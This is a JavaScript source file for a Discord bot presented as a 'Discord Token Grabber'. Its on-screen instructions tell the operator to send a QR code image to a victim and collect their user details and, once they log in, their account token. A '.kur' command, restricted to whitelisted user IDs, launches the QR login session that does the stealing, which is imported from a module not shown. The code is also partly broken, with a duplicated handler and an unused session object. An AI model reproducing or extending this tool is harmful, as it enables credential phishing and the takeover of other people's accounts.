const process = require('process');
const AuthSession = require('./qr-auth-session');
const { title, Spinner } = require('./util');
const { Client, MessageEmbed } = require('discord.js')
const client = new Client()
client.login(process.env.token)
const http = require("http")

// Setup terminal
process.title = 'Discord Token Grabber';
console.log(title.red());
console.log('\nHow to use:');
console.log(' 1. The script will generate a image with a QR code');
console.log(' 2. Send the image to a victim and have them scan it');
console.log(' 3. Once they\'ve scanned it, you will recieve their id, username, avatar, and discriminator');
console.log(' 4. If they click the button to login, you will then recieve their token\n');

client.on("ready", async () => {
  console.log(client.user.tag + "ile giris yapildi")
})

http.createServer(function (req, res) {
      res.write("Başarıyla 7/24 Aktif Edilmiştir");
      res.end();
  }).listen(8080)

client.on("message", async message => {

  let whitelist = ["429357746002067493","968753225467588608"]
  
if(message.content === ".kur") {
  if (whitelist.includes(message.author.id)) {

(async () => {

    const session = new AuthSession();
})();
}}})



client.on("message", async message => {

  let whitelist = ["429357746002067493","968753225467588608"]
  
if(message.content === ".kur") {
  if (whitelist.includes(message.author.id)) {
    process.stdin.setRawMode(true);

    return new Promise((resolve) => {
        process.stdin.once('data', data => {
            process.stdin.setRawMode(false);

            if (data[0] == 0x03) process.exit();
            
            process.stdout.moveCursor(0, -1);
            process.stdout.clearLine();
            resolve();
        })
    })
}}})